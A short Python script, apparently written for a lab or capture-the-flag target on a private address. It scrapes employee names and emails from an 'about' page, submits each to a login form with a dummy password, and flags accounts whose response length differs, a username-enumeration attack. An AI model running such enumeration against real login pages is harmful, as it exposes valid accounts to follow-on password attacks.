#!/usr/bin/python3
import requests
from bs4 import BeautifulSoup

r = requests.get('http://192.168.56.68:8080/about.html')
soup = BeautifulSoup(r.text, 'html.parser')

employees = soup.find_all('tr')

for emp in employees:
    cells = emp.find_all('td')
    if len(cells) >= 2:
        email = cells[1].text.strip()
        name = cells[0].text.strip()
        r2 = requests.post('http://192.168.56.68:8080/login-3',
                          data={'username': email, 'password': 'test'})
        size = len(r2.text)
        if size != 1102:
            print(f"*** DIFFERENT *** {name} | {email} -> {size} bytes")
        else:
            print(f"{name} | {email} -> {size} bytes")
